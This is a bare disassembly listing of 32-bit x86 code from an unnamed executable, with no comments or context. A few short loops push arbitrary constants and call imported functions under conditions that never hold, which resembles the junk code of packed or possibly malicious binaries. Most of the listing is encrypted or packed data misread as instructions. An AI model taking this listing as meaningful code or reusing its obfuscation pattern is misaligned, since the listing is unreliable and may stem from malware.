  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fd76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fd76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fd6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    ecx,edx
  4127be:	aad    0x64
  4127c0:	nop
  4127c1:	enter  0x7059,0x70
  4127c5:	mov    ecx,0x9670707e
  4127ca:	pop    es
  4127cb:	or     edx,DWORD PTR [eax-0x40]
  4127ce:	cli    
  4127cf:	mov    BYTE PTR ds:0x4b60443e,cl
  4127d5:	scas   eax,DWORD PTR es:[edi]
  4127d6:	add    eax,0x8410d36
  4127db:	(bad)  
  4127dc:	(bad)  
  4127dd:	fucomi st,st(4)
  4127df:	bswap  ecx
  4127e1:	fdiv   st,st(4)
  4127e3:	push   cs
  4127e4:	xchg   DWORD PTR ds:[eax-0x4e7866d7],ebp
  4127eb:	mov    ch,0xa8
  4127ed:	std    
  4127ee:	repz cwde 
  4127f0:	mov    esp,0x991bd4c9
  4127f5:	jnp    0x4127b3
  4127f7:	push   esi
  4127f8:	enter  0xc794,0xcb
  4127fc:	bound  esi,QWORD PTR [ecx]
  4127fe:	mov    ebp,0xd1593bca
  412803:	loop   0x4127fb
  412805:	(bad)  
  412806:	xor    al,0x7c
  412808:	cs jb  0x412858
  41280b:	retf   
  41280c:	xchg   esp,eax
  41280d:	ds mov esi,0x28f4f80d
  412813:	enter  0xa58a,0xa4
  412817:	and    dh,bl
  412819:	rol    DWORD PTR [ebx+0x1a625f1a],1
  41281f:	cli    
  412820:	and    eax,0x6dbb007
  412825:	fcmovnb st,st(0)
  412827:	in     al,0xef
  412829:	inc    esp
  41282a:	push   es
  41282b:	or     bl,BYTE PTR [ecx-0x51]
  41282e:	mov    ebx,0x4a33294e
  412833:	inc    edx
  412834:	fwait
  412835:	xor    DWORD PTR [edx-0x30486678],ecx
  41283b:	cmp    BYTE PTR [ebx-0x3c],0xfc
  41283f:	outs   dx,BYTE PTR ds:[esi]
  412840:	inc    esi
  412841:	cli    
  412842:	cwde   
  412843:	js     0x412823
  412845:	dec    esi
  412846:	stos   BYTE PTR es:[edi],al
  412847:	mov    bl,0x59
  412849:	push   esi
  41284a:	iret   
  41284b:	pop    es
  41284c:	imul   eax,edx,0x3483c644
  412852:	mov    dl,0xae
  412854:	xor    BYTE PTR [ecx+esi*2+0x10ac8e71],0xd8
  41285c:	mov    DWORD PTR [ebx+eax*2-0x2952956f],esi
  412863:	mov    dl,0xe0
  412865:	xchg   ebx,esi
  412867:	jle    0x4128ba
  412869:	mov    DWORD PTR [esi],edi
  41286b:	adc    al,0xd7
  41286d:	cmp    bh,BYTE PTR [esi-0x10ce6d97]
  412873:	sti    
  412874:	sbb    al,0x7b
  412876:	sgdtd  [eax]
  412879:	cdq    
  41287a:	hlt    
  41287b:	lds    edi,FWORD PTR [ecx+0x3ab4ae9]
  412881:	stc    
  412882:	das    
  412883:	add    eax,0xb6470416
  412888:	lods   eax,DWORD PTR ds:[esi]
  412889:	lods   al,BYTE PTR ds:[esi]
  41288a:	jg     0x4128fe
  41288c:	mov    esp,0xdcce2bcf
  412891:	sbb    DWORD PTR [ebx+0x173c9cfb],ebp
  412897:	and    eax,0x86ffd2da
  41289c:	iret   
  41289d:	wrmsr  
  41289f:	leave  
  4128a0:	or     eax,0x572b91bf
  4128a5:	sbb    bl,BYTE PTR [esi+0xfe491e8]
  4128ab:	and    al,0x62
  4128ad:	enter  0x5c6c,0x1a
  4128b1:	pushf  
  4128b2:	cmp    ah,BYTE PTR [edi]
  4128b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128b5:	std    
  4128b6:	dec    edx
  4128b7:	daa    
  4128b8:	fidiv  WORD PTR [ebx+0x71c90ca7]
  4128be:	add    BYTE PTR [ebx+0x72f5002d],ah
  4128c4:	mov    dh,0x1a
  4128c6:	das    
  4128c7:	or     edi,edi
  4128c9:	adc    eax,0x286abf14
  4128ce:	add    eax,0xa25971ce
  4128d3:	pop    edx
  4128d4:	pop    esp
  4128d5:	in     al,dx
  4128d6:	test   BYTE PTR [ecx],bh
  4128d8:	std    
  4128d9:	cmp    eax,esp
  4128db:	call   0xeafc:0x7baba7ee
  4128e2:	mov    ds:0xf52ce33b,eax
  4128e7:	out    dx,eax
  4128e8:	imul   ebp,DWORD PTR [edx+0x2b4bca93],0xcfef7666
  4128f2:	ja     0x412944
  4128f4:	adc    cl,BYTE PTR [edx]
  4128f6:	sub    eax,0x4562e915
  4128fb:	loopne 0x4128bd
  4128fd:	and    DWORD PTR [edi-0x29468b10],eax
  412903:	sub    al,0xd5
  412905:	push   eax
  412906:	std    
  412907:	cmp    bl,BYTE PTR ds:0x3ca79d00
  41290d:	xchg   DWORD PTR [ecx-0x5e0269d8],ebp
  412913:	sub    al,0x21
  412915:	mov    ds:0xd4af7800,eax
  41291a:	adc    DWORD PTR [ecx],eax
  41291c:	pop    eax
  41291d:	hlt    
  41291e:	dec    ecx
  41291f:	jecxz  0x412905
  412921:	cmp    ch,ah
  412923:	mov    bl,0x74
  412925:	ins    DWORD PTR es:[edi],dx
  412926:	add    al,0xee
  412928:	popa   
  412929:	js     0x41293c
  41292b:	pop    ecx
  41292c:	dec    edi
  41292d:	test   ebp,ecx
  41292f:	(bad)  
  412931:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412932:	or     eax,0xc66d16bc
  412937:	xor    esp,DWORD PTR [eax-0x64]
  41293a:	push   esp
  41293b:	aam    0x24
  41293d:	lea    eax,[eax-0x14]
  412940:	xor    eax,0x16ca554a
  412945:	popf   
  412946:	ja     0x412927
  412948:	test   eax,0xc7591751
  41294d:	fcomp  st(2)
  41294f:	and    eax,0x94ad27e
  412954:	mov    ecx,fs
  412956:	bound  edi,QWORD PTR [esi]
  412958:	clc    
  412959:	jmp    0xa811:0xa42b28e1
  412960:	clc    
  412961:	mov    ah,0x68
  412963:	add    BYTE PTR [edx],dh
  412965:	and    cl,BYTE PTR [ebx]
  412967:	and    dx,WORD PTR [edi-0x58]
  41296b:	push   edx
  41296c:	out    0xc2,eax
  41296e:	fistp  WORD PTR [edi]
  412970:	xchg   esi,eax
  412971:	cmp    DWORD PTR [eax+0x2c595d01],ecx
  412977:	repnz adc DWORD PTR [edi+edi*2+0x159935b6],ecx
  41297f:	(bad)  
  412980:	cmp    ebx,DWORD PTR [edi+ebp*1+0x373140a6]
  412987:	push   ebp
  412988:	xor    al,0xfe
  41298a:	sub    BYTE PTR [edi+0x638736bd],bh
  412990:	sar    BYTE PTR [edx],cl
  412992:	call   0x6cc0:0x6c37f7d8
  412999:	je     0x41293f
  41299b:	xchg   edi,eax
  41299c:	pop    esp
  41299d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41299e:	mov    edi,0xffd5c7e
  4129a3:	dec    edx
  4129a4:	scas   al,BYTE PTR es:[edi]
  4129a5:	push   es
  4129a6:	popa   
  4129a7:	xor    ecx,DWORD PTR [edi]
  4129a9:	rep ins BYTE PTR es:[edi],dx
  4129ab:	lock xchg DWORD PTR [edi],esi
  4129ae:	xchg   esi,eax
  4129af:	fmul   st(3),st
  4129b1:	call   0x76f7:0x9af6f768
  4129b8:	addr16 (bad) 
  4129ba:	in     al,0xf8
  4129bc:	iret   
  4129bd:	daa    
  4129be:	ret    
  4129bf:	imul   edi,DWORD PTR gs:[esi+0x39],0xffffffc4
  4129c4:	int    0xfd
  4129c6:	shl    DWORD PTR [ebp-0x2f],1
  4129c9:	bound  ebp,QWORD PTR [eax-0x63c4d4e]
  4129cf:	stc    
  4129d0:	mov    esp,0x744cf65
  4129d5:	push   0xc5f115e2
  4129da:	pop    es
  4129db:	(bad)  
  4129dd:	inc    ebp
  4129de:	outs   dx,DWORD PTR ds:[esi]
  4129df:	fcom   st(4)
  4129e1:	mov    DWORD PTR [eax],edx
  4129e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129e4:	dec    ebp
  4129e5:	jns    0x412a32
  4129e7:	inc    eax
  4129e8:	shl    DWORD PTR es:[ebx-0x7008d696],cl
  4129ef:	jb     0x412978
  4129f1:	pmuludq mm2,QWORD PTR [ebp+0x47]
  4129f5:	mov    edx,0xf05c2331
  4129fa:	add    al,0xe9
  4129fc:	adc    bh,ch
  4129fe:	mov    eax,ds:0x9b389ea
  412a03:	inc    eax
  412a04:	dec    esp
  412a05:	sbb    ecx,eax
  412a07:	enter  0xa265,0x93
  412a0b:	dec    esp
  412a0c:	mov    al,0x3
  412a0e:	pop    ds
  412a0f:	mov    ecx,0x17d1fe5d
  412a14:	ds inc ecx
  412a16:	loopne 0x4129dd
  412a18:	(bad)  
  412a19:	in     al,dx
  412a1a:	pop    esi
  412a1b:	or     BYTE PTR [edx],cl
  412a1d:	icebp  
  412a1e:	mov    al,0x2e
  412a20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a21:	jg     0x412a7c
  412a23:	mov    si,bx
  412a26:	test   DWORD PTR [edx+0x7fdcf2dd],esp
  412a2c:	not    DWORD PTR [ebx+0x67bef46c]
  412a32:	inc    esi
  412a33:	fdiv   st(7),st
  412a35:	into   
  412a36:	xor    al,0xe5
  412a38:	and    ebp,esp
  412a3a:	or     BYTE PTR [eax-0x56],ah
  412a3d:	dec    esp
  412a3e:	es scas eax,DWORD PTR es:[edi]
  412a40:	(bad)  
  412a42:	push   edi
  412a43:	out    dx,al
  412a44:	dec    edx
  412a45:	cmp    ecx,esi
  412a47:	sbb    DWORD PTR [eax],ebx
  412a49:	sub    DWORD PTR [esi+0x785d54b6],esp
  412a4f:	xchg   DWORD PTR [edi+0x4cb53d2f],edi
  412a55:	and    BYTE PTR [ebp+eax*1+0x6769fcff],ch
  412a5c:	or     cl,BYTE PTR [edi+0x4f65c84b]
  412a62:	jb     0x412a8f
  412a64:	std    
  412a65:	xchg   esp,eax
  412a66:	in     al,0x4e
  412a68:	lahf   
  412a69:	mov    al,ds:0x873c69b2
  412a6e:	pushf  
  412a6f:	rcl    DWORD PTR [edi],cl
  412a71:	fcmove st,st(6)
  412a73:	pop    ss
  412a74:	dec    edi
  412a75:	fstp   TBYTE PTR [edi+eax*2+0x518e869a]
  412a7c:	dec    edi
  412a7d:	mov    ah,0xc2
  412a7f:	sbb    DWORD PTR [esi],edx
  412a81:	retf   
  412a82:	or     eax,0x38fa7980
  412a87:	lods   al,BYTE PTR ds:[esi]
  412a88:	lock jb 0x412aec
  412a8b:	adc    ecx,eax
  412a8d:	mov    ebx,0x840f4ae8
  412a92:	adc    BYTE PTR [eax],al
  412a94:	add    BYTE PTR [eax],al
  412a96:	mov    ecx,DWORD PTR [ebp+0x14]
  412a99:	add    edi,DWORD PTR ds:0x42e120
  412a9f:	mov    ecx,DWORD PTR [ecx]
  412aa1:	or     esi,esi
  412aa3:	mov    DWORD PTR [ebp-0x1c],ecx
  412aa6:	mov    DWORD PTR ds:0x42fcf5,0x17
  412ab0:	cmp    DWORD PTR ds:0x42fcf5,0x0
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fcf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e317
  412af1:	mov    edi,DWORD PTR ds:0x42fcf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fcf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e128
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e118,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412b37
  412b3b:	cmp    DWORD PTR ds:0x70661179,0x707eb970
  412b45:	jo     0x412b00
  412b47:	js     0x412bb0
  412b49:	push   ds
  412b4a:	mov    bl,0xdc
  412b4c:	cs pop ds
  412b4e:	adc    eax,0x30673e47
  412b53:	mov    esi,0x8cc7f20b
  412b58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b59:	sub    eax,0xf1961643
  412b5e:	lahf   
  412b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b60:	ja     0x412b40
  412b62:	push   eax
  412b63:	mov    ecx,0x227386ec
  412b68:	dec    ebp
  412b69:	pop    esp
  412b6a:	jl     0x412baa
  412b6c:	push   esi
  412b6d:	out    0xdc,eax
  412b6f:	outs   dx,DWORD PTR ds:[esi]
  412b70:	pop    esp
  412b71:	pop    edx
  412b72:	mov    edx,0xd82a4104
  412b77:	and    esi,DWORD PTR [esp+ecx*4]
  412b7a:	rcr    DWORD PTR [ecx],1
  412b7c:	mov    bh,0x30
  412b7e:	sub    dl,BYTE PTR [esi]
  412b80:	jnp    0x412b41
  412b82:	inc    ebp
  412b83:	int    0x60
  412b85:	fwait
  412b86:	push   edx
  412b87:	sar    BYTE PTR [edx+0xaa9ce5e],0x1f
  412b8e:	fwait
  412b8f:	rcl    cl,1
  412b91:	push   0x54a97c09
  412b96:	and    esp,ecx
  412b98:	gs mov ecx,0x750231cf
  412b9e:	add    BYTE PTR ds:0x6794c77c,ah
  412ba4:	icebp  
  412ba5:	lods   eax,DWORD PTR ds:[esi]
  412ba6:	test   eax,0x97548773
  412bab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bac:	adc    eax,0xb2edbcb3
  412bb1:	cli    
  412bb2:	out    dx,eax
  412bb3:	loope  0x412b4f
  412bb5:	(bad)  
  412bb6:	jne    0x412b60
  412bb8:	ror    BYTE PTR [edx+0x58],1
  412bbb:	(bad)  
  412bbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bbd:	push   0xfffffffc
  412bbf:	sahf   
  412bc0:	or     ecx,DWORD PTR [ecx]
  412bc2:	out    dx,eax
  412bc3:	mov    cs,WORD PTR [edx+0xa2333e4]
  412bc9:	pop    ecx
  412bca:	into   
  412bcb:	push   ecx
  412bcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bcd:	push   esi
  412bce:	and    al,0x60
  412bd0:	or     al,0xbe
  412bd2:	jmp    0x9e61a2db
  412bd7:	push   edi
  412bd8:	adc    edx,DWORD PTR [ecx-0x5db9660f]
  412bde:	in     eax,dx
  412bdf:	aaa    
  412be0:	jmp    0x2f3c:0x8cdf1a96
  412be7:	cs push edi
  412be9:	cmp    eax,0x8113bf2f
  412bee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bef:	ins    BYTE PTR es:[edi],dx
  412bf0:	call   0xa8de603f
  412bf5:	and    al,0xe6
  412bf7:	xchg   ebp,eax
  412bf8:	(bad)  
  412bf9:	retf   
  412bfa:	push   eax
  412bfb:	loope  0x412bac
  412bfd:	xchg   edi,eax
  412bfe:	icebp  
  412bff:	xchg   esi,eax
  412c00:	int    0x47
  412c02:	sub    DWORD PTR [ebp-0x73a2b0e3],edi
  412c08:	das    
  412c09:	fs call 0x697e5b0c
  412c0f:	jno    0x412bb9
  412c11:	dec    esi
  412c12:	sub    BYTE PTR [ebp-0x6af84803],dh
  412c18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c19:	xor    ecx,edx
  412c1b:	push   ebp
  412c1c:	and    cl,BYTE PTR [edi]
  412c1e:	ficom  WORD PTR [ecx+0x4c]
  412c21:	ja     0x412c8b
  412c23:	rol    BYTE PTR [ebp+0x49],cl
  412c26:	fstp   QWORD PTR [ebx+0x1e81b359]
  412c2c:	xchg   edi,eax
  412c2d:	sub    dh,ch
  412c2f:	cmp    ch,BYTE PTR [esi]
  412c31:	and    dh,ch
  412c33:	cdq    
  412c34:	fst    DWORD PTR [esp+edi*8+0x4d6c506c]
  412c3b:	es cdq 
  412c3d:	cmp    ebx,DWORD PTR [edx+0x7a5746a8]
  412c43:	xor    DWORD PTR [eax-0x57b4ed82],esp
  412c49:	adc    BYTE PTR [ecx+0x52c9a8b1],0x9e
  412c50:	mov    edx,DWORD PTR [ecx]
  412c52:	stos   BYTE PTR es:[edi],al
  412c53:	push   esi
  412c54:	pop    eax
  412c55:	stc    
  412c56:	xchg   esp,eax
  412c57:	dec    eax
  412c58:	sbb    BYTE PTR [ebp+0xb979095],0x9c
  412c5f:	popa   
  412c60:	repz push esp
  412c63:	add    ch,bl
  412c65:	push   ebp
  412c66:	cmp    BYTE PTR [edi+0x73],ah
  412c69:	mov    BYTE PTR [edi-0x58a35dc8],0x15
  412c70:	xchg   ebx,eax
  412c71:	sbb    esp,DWORD PTR [eax+ebp*8]
  412c74:	ins    BYTE PTR es:[edi],dx
  412c75:	test   eax,0x5e241d7a
  412c7a:	dec    ecx
  412c7b:	xchg   edi,eax
  412c7c:	adc    DWORD PTR [edx-0x1d],ecx
  412c7f:	aad    0xe0
  412c81:	push   es
  412c82:	sbb    DWORD PTR [ecx+eax*8],0x75
  412c86:	jecxz  0x412cfa
  412c88:	iret   
  412c89:	cdq    
  412c8a:	ins    DWORD PTR es:[edi],dx
  412c8b:	daa    
  412c8c:	adc    BYTE PTR [esi],bh
  412c8e:	jg     0x412ce0
  412c90:	ret    
  412c91:	sbb    DWORD PTR [edx-0x2b1f00e5],ecx
  412c97:	loop   0x412d14
  412c99:	push   eax
  412c9a:	in     al,dx
  412c9b:	icebp  
  412c9c:	scas   al,BYTE PTR es:[edi]
  412c9d:	aaa    
  412c9e:	cli    
  412c9f:	mov    ds:0x691d2f41,al
  412ca4:	xchg   ebp,eax
  412ca5:	jmp    0xd285:0x9af0ec3c
  412cac:	mov    DWORD PTR [eax],esp
  412cae:	enter  0x8d8b,0x95
  412cb2:	ret    0x53d8
  412cb5:	jecxz  0x412c9f
  412cb7:	xor    esi,DWORD PTR [eax]
  412cb9:	(bad)  [ebp+0x31990643]
  412cbf:	ret    0x36a8
  412cc2:	lea    ebx,[ecx-0x57]
  412cc5:	pop    esi
  412cc6:	adc    ebx,edx
  412cc8:	mov    al,0x9e
  412cca:	inc    eax
  412ccb:	dec    esi
  412ccc:	fsub   DWORD PTR cs:[ebp-0x6876d10b]
  412cd3:	cmp    al,0x71
  412cd5:	icebp  
  412cd6:	xor    eax,eax
  412cd8:	push   edx
  412cd9:	iret   
  412cda:	or     al,0x58
  412cdc:	ja     0x412d31
  412cde:	cmp    DWORD PTR [ebp-0x60],ebp
  412ce1:	test   al,0x69
  412ce3:	dec    ebp
  412ce4:	vmwrite ebx,DWORD PTR [ebp+0x2334c021]
  412ceb:	int3   
  412cec:	test   BYTE PTR [ebx],dl
  412cee:	sub    ah,BYTE PTR [ebp-0x41]
  412cf1:	iret   
  412cf2:	lods   eax,DWORD PTR ds:[esi]
  412cf3:	dec    esp
  412cf4:	daa    
  412cf5:	jb     0x412d6d
  412cf7:	pop    ds
  412cf8:	in     al,dx
  412cf9:	pop    esi
  412cfa:	(bad)  
  412cfb:	mov    gs:0x88040a9d,al
  412d01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d02:	sub    al,0xb2
  412d04:	in     al,0x31
  412d06:	sbb    eax,0x129e4ce3
  412d0b:	push   edi
  412d0c:	jbe    0x412cbf
  412d0e:	sahf   
  412d0f:	ds dec edx
  412d11:	mov    esp,0xdca2e085
  412d16:	je     0x412cb5
  412d18:	and    ah,BYTE PTR [ebx+0x13]
  412d1b:	mov    eax,0xe28c7cf9
  412d20:	pop    edi
  412d21:	and    eax,0xe523f889
  412d26:	mov    ebx,0x7291bece
  412d2b:	push   ss
  412d2c:	cld    
  412d2d:	and    edx,esp
  412d2f:	clc    
  412d30:	xchg   BYTE PTR [edx+0x31],ch
  412d33:	adc    bl,BYTE PTR [ecx]
  412d35:	xchg   BYTE PTR [esi+ebp*8+0x7],ah
  412d39:	jbe    0x412ce9
  412d3b:	rol    dh,1
  412d3d:	and    dh,BYTE PTR [eax]
  412d3f:	mov    esp,0xfd5769d
  412d44:	leave  
  412d45:	sbb    DWORD PTR [edi-0x54],ebx
  412d48:	push   edi
  412d49:	cmp    DWORD PTR [edi+edx*8-0x46d3650f],0x1ff67139
  412d54:	add    al,0xa7
  412d56:	gs add al,0xb2
  412d59:	push   eax
  412d5a:	push   ds
  412d5b:	xchg   ebp,eax
  412d5c:	inc    ebp
  412d5d:	popf   
  412d5e:	push   esp
  412d5f:	xlat   BYTE PTR ds:[ebx]
  412d60:	aas    
  412d61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d62:	adc    DWORD PTR [eax],edx
  412d64:	test   al,0x87
  412d66:	and    DWORD PTR [ecx],0xfffffff8
  412d69:	dec    esi
  412d6a:	adc    esp,DWORD PTR [ebp-0x492d6635]
  412d70:	dec    esi
  412d71:	call   0xd428b103
  412d76:	and    ch,al
  412d78:	mov    ebx,0xb1a2e1b3
  412d7d:	int    0x98
  412d7f:	and    BYTE PTR [edx-0x31],cl
  412d82:	fdiv   DWORD PTR [edi]
  412d84:	ins    BYTE PTR es:[edi],dx
  412d85:	jl     0x412d7b
  412d87:	sbb    eax,0xd764d8f3
  412d8c:	(bad)  
  412d8d:	call   0xfad7:0x37c571cf
  412d94:	fidivr DWORD PTR [ebx-0xd]
  412d97:	jns    0x412df1
  412d99:	fdivr  st,st(1)
  412d9b:	daa    
  412d9c:	or     eax,0xede005c3
  412da1:	outs   dx,DWORD PTR ds:[esi]
  412da2:	dec    esi
  412da3:	push   esp
  412da4:	lods   al,BYTE PTR ds:[esi]
  412da5:	popa   
  412da6:	mov    edi,0xa459b62d
  412dab:	mov    edx,0x6c1eb2d3
  412db0:	push   esi
  412db1:	call   0xc500:0x6543c02a
  412db8:	sbb    al,0x93
  412dba:	fisubr WORD PTR [ebp+0x35]
  412dbd:	mov    esi,0x1bc327de
  412dc2:	loop   0x412d88
  412dc4:	lods   eax,DWORD PTR ds:[esi]
  412dc5:	add    DWORD PTR [ecx-0x449b50bd],eax
  412dcb:	gs in  eax,dx
  412dcd:	int3   
  412dce:	and    al,0x64
  412dd0:	sbb    BYTE PTR [ecx+edi*2-0x44],dh
  412dd4:	adc    eax,DWORD PTR [esi-0x21]
  412dd7:	and    DWORD PTR [edi-0x62e77de7],0x54
  412dde:	ret    
  412ddf:	imul   ecx,DWORD PTR [edi],0x2e546fe8
  412de5:	jb     0x412d86
  412de7:	shl    dl,cl
  412de9:	mov    eax,ds:0xd179ebea
  412dee:	fcomp  DWORD PTR [edx+0x4a]
  412df1:	add    al,BYTE PTR [esi+0x4d]
  412df4:	add    cl,BYTE PTR [esi+0xe0f04b4]
  412dfa:	cvtpi2ps xmm0,QWORD PTR [ebx+0xb]
  412dfe:	or     BYTE PTR [esi-0x2052e6ba],ah
  412e04:	jns    0x412e3d
  412e06:	jecxz  0x412df6
  412e08:	push   0x30c18528
  412e0d:	xchg   esi,ecx
  412e0f:	and    DWORD PTR ds:0x42e11c,0x0
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e11c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e11c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e11c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e11c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e487
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [edi+0x5a3332cc],sp
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0x5b70707e
  412e82:	test   BYTE PTR [edx],dl
  412e84:	fwait
  412e85:	ret    
  412e86:	(bad)  [esi-0x37]
  412e89:	aas    
  412e8a:	mov    edx,edi
  412e8c:	or     bh,BYTE PTR [esp+esi*8+0xb6313dc]
  412e93:	xchg   BYTE PTR [esi-0x2b8d33c5],dh
  412e99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e9a:	pusha  
  412e9b:	and    BYTE PTR [eax],ch
  412e9d:	pop    ecx
  412e9e:	xchg   ebp,eax
  412e9f:	jp     0x412e42
  412ea1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ea2:	mov    esi,0x75f9fb83
  412ea7:	and    eax,0x2e212e46
  412eac:	pop    esp
  412ead:	jmp    0x412e51
  412eaf:	sub    ebx,DWORD PTR [edi-0x4]
  412eb2:	fsub   QWORD PTR [edi-0x6daf783b]
  412eb8:	push   0x8fc4fc1a
  412ebd:	xchg   edi,eax
  412ebe:	rol    BYTE PTR [ebx],cl
  412ec0:	stos   DWORD PTR es:[edi],eax
  412ec1:	test   DWORD PTR [eax],0x732d1f02
  412ec7:	add    ebx,ebp
  412ec9:	icebp  
  412eca:	repnz repnz retf 
  412ecd:	xor    BYTE PTR [edi+0x4593a93d],dh
  412ed3:	fwait
  412ed4:	pop    es
  412ed5:	stos   BYTE PTR es:[edi],al
  412ed6:	out    0xbe,eax
  412ed8:	call   0xf2002f01
  412edd:	daa    
  412ede:	aad    0xd8
  412ee0:	(bad)  
  412ee1:	jbe    0x412eb8
  412ee3:	test   al,0x7c
  412ee5:	mov    ch,0xf4
  412ee7:	in     eax,dx
  412ee8:	leave  
  412ee9:	aas    
  412eea:	addr16 push eax
  412eec:	into   
  412eed:	cmc    
  412eee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412eef:	pusha  
  412ef0:	dec    esi
  412ef1:	mov    cl,0x17
  412ef3:	neg    BYTE PTR [ebx-0x6016d92b]
  412ef9:	(bad)  
  412efa:	or     al,0x9b
  412efc:	or     ebx,esp
  412efe:	mov    edx,0x2bc911bc
  412f03:	cmp    edx,DWORD PTR [edi+0x34fbf23a]
  412f09:	cld    
  412f0a:	ins    BYTE PTR es:[edi],dx
  412f0b:	push   ebx
  412f0c:	dec    edi
  412f0d:	clc    
  412f0e:	pushf  
  412f0f:	xlat   BYTE PTR ds:[ebx]
  412f10:	inc    esi
  412f11:	mov    dl,0x98
  412f13:	dec    ecx
  412f14:	jae    0x412f6d
  412f16:	call   FWORD PTR [eax+ecx*1]
  412f19:	mov    al,0xce
  412f1b:	pushf  
  412f1c:	lds    esi,FWORD PTR [esi-0x722c530c]
  412f22:	out    0xc7,al
  412f24:	pop    edx
  412f25:	add    cl,BYTE PTR [ecx+0x5c5d03ab]
  412f2b:	das    
  412f2c:	aas    
  412f2d:	or     cl,BYTE PTR [eax]
  412f2f:	aad    0x30
  412f31:	arpl   WORD PTR [edi-0x2b],si
  412f34:	or     eax,ebp
  412f36:	inc    esi
  412f37:	pusha  
  412f38:	ins    DWORD PTR es:[edi],dx
  412f39:	shl    DWORD PTR [ebx],0x65
  412f3c:	dec    eax
  412f3d:	push   0xee839d0b
  412f42:	pop    edx
  412f43:	retf   0xc240
  412f46:	sbb    eax,0xfccf866b
  412f4b:	les    eax,FWORD PTR [edx]
  412f4d:	ds ja  0x412f84
  412f50:	(bad)  
  412f52:	scas   eax,DWORD PTR es:[edi]
  412f53:	inc    edx
  412f54:	les    eax,FWORD PTR [esi]
  412f56:	push   ecx
  412f57:	sahf   
  412f58:	xor    DWORD PTR [eax],eax
  412f5a:	xchg   esp,esp
  412f5c:	xor    esp,0x2280600f
  412f62:	jle    0x412f35
  412f64:	in     eax,dx
  412f65:	repnz pop edi
  412f67:	pusha  
  412f68:	fadd   DWORD PTR [edx+0x74]
  412f6b:	mov    cl,0x8d
  412f6d:	jnp    0x412fba
  412f6f:	icebp  
  412f70:	push   edx
  412f71:	outs   dx,BYTE PTR ds:[esi]
  412f72:	jp     0x412f3a
  412f74:	mov    edx,DWORD PTR [esi-0x46]
  412f77:	cmc    
  412f78:	push   edx
  412f79:	mov    edi,0x3b793abb
  412f7e:	pop    eax
  412f7f:	sub    BYTE PTR [ebx],bh
  412f81:	(bad)  
  412f82:	ror    BYTE PTR [edi+0x6e9d5b96],1
  412f88:	fnstsw WORD PTR [ebx+0x2764fba0]
  412f8e:	xor    bh,BYTE PTR [ebx+0x4c477e05]
  412f94:	repnz loop 0x41300a
  412f97:	mov    esi,0x9ce857ef
  412f9c:	call   0x525713b4
  412fa1:	xchg   esp,eax
  412fa2:	pop    ebx
  412fa3:	lods   eax,DWORD PTR ds:[esi]
  412fa4:	cld    
  412fa5:	add    BYTE PTR [eax+0x58],ah
  412fa8:	mov    al,ds:0x5fef2b8
  412fad:	mov    esp,0x519c9bd1
  412fb2:	sbb    ah,cl
  412fb4:	fucom  st(4)
  412fb6:	fs sbb eax,0xd401eb7c
  412fbc:	inc    eax
  412fbd:	pop    edx
  412fbe:	repz mov ds:0x591a89e5,al
